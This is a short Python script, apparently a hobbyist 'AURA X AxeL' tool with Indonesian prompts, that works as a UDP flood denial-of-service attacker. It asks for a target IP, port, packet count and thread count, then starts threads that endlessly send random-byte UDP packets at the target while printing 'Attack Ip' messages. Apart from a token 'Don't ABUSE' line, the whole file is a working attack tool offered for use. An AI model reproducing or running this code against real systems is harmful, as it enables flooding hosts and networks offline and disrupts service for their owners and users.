#!/usr/bin/env python3
#/CODE PUNYA AXEL
import struct
import time
import socket
import random
import threading
import os
import sys

os.system("clear")
print("""\033[96m

░█████╗░██╗░░░██╗██████╗░░█████╗░
██╔══██╗██║░░░██║██╔══██╗██╔══██╗
███████║██║░░░██║██████╔╝███████║
██╔══██║██║░░░██║██╔══██╗██╔══██║
██║░░██║╚██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝

██╗░░██╗
╚██╗██╔╝
░╚███╔╝░
░██╔██╗░
██╔╝╚██╗
╚═╝░░╚═╝

░█████╗░██╗░░██╗███████╗██╗░░░░░
██╔══██╗╚██╗██╔╝██╔════╝██║░░░░░
███████║░╚███╔╝░█████╗░░██║░░░░░
██╔══██║░██╔██╗░██╔══╝░░██║░░░░░
██║░░██║██╔╝╚██╗███████╗███████╗
╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚══════╝ """)
print("""\033[91m
          MADE WITH CODE
          BY AURA X AxeL
           Don't ABUSE
""")

ip = str(input("\033[94m====> ★ IP   : "))
port = int(input("====> $ PORT   : "))
times = int(input("====> $ PACKET   : "))
threads = int(input("====> $ KIRIM THREADS   : "))
choice = str(input("====> ★ Confirm y/n  : "))

os.system("clear")

def run():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] LeoGanteng Attack Ip \033[93m{ip} \033[92mPort \033[93m{port} \033[93m!!!")
		except:
			print(f" \033[92m[×] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")

def run2():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")

def run3():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
			
def run4():
	data = random._urandom(655)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] LeoGanteng Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")



for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	else:
		th = threading.Thread(target = run4)
		th.start()
